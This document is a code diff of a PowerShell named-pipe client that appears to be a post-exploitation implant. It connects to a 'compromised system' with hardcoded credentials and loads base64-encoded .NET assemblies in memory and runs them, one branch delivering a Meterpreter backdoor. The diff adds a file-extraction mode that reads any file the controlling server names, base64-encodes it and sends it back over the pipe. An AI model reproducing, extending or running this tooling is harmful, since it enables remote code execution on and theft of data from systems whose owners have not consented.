@@ -16,18 +16,23 @@ function ReadCommand ([System.IO.StreamReader]$StreamReader){ #Read Command from
         return $status
     }
     elseif($msg -eq "action=4"){
-        Write-Host "Disconnected."
+        Write-Host "----------- File Extraction -----------"
         $status = "4"
+        return $status
+    }
+    elseif($msg -eq "action=5"){
+        Write-Host "Disconnected."
+        $status = "5"
         return $status
     }
 }
 
 $pipeName = "YahudPipe"
 # Compromised system
-$pipeServer = ""
+$pipeServer = "192.168.101.13"
 # Compromised account
-$username = ""
-$password = ""
+$username = "HakkYahud"
+$password = "Root*123"
 # Authenticate to the server before connecting to the Server pipe
 $auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
 Invoke-Expression -Command $auth
@@ -58,6 +63,7 @@ while($pipeClient.IsConnected){
     elseif($status -eq "1"){
         $msg = $sr.ReadLine()
         if($msg -eq "stop"){
+            Write-Host "Stop receiving message..."
             $status = "0"
         }
         else{
@@ -74,11 +80,6 @@ while($pipeClient.IsConnected){
             $assemblyB64 = $sr.ReadLine()
             $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
             $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
-            Write-Host "Waiting for parameter..."
-            [String]$param = $sr.ReadLine() 
-            Write-Host "Parameter received : ", $param
-            [String[]]$parameter = @(, $param)
-            $parameter_invoke = (, $parameter)
             $assembly.EntryPoint.Invoke($null, $null)
         }
         elseif($script_action -eq "Meterpreter"){
@@ -87,7 +88,6 @@ while($pipeClient.IsConnected){
             $assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
             $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
             [String]$param = $sr.ReadLine() # Receiving backdoor from server
-            # [String]$filename = "C:\Users\adminPC\Documents\Admin\Yahudmeter\exploit.txt"
             [String[]]$parameter = @(, $param)
             $parameter_invoke = (, $parameter)
             $assembly.EntryPoint.Invoke($null, $parameter_invoke)
@@ -132,6 +132,29 @@ while($pipeClient.IsConnected){
     }
 
     elseif($status -eq "4"){
+        $filepath = $sr.ReadLine()
+
+        if($filepath -eq "stop"){
+            Write-Host "Stop copying file..."
+            $status = "0"
+        }
+
+        else{
+            try{
+                Write-Host "Copying file to host"
+                $filebytes = [System.IO.File]::ReadAllBytes($filepath)
+                $fileB64 = [System.Convert]::ToBase64String($filebytes)
+                Write-Host $filebytes
+                $sw.WriteLine($fileB64)  
+            }
+            catch [System.IO.FileNotFoundException]{
+                Write-Host "File Not Found...Stop copying"
+                $sw.WriteLine("File Not Found...")
+            }                    
+        }
+    }
+
+    elseif($status -eq "5"){
         $sr.Dispose();
         $pipeClient.Dispose();
     }
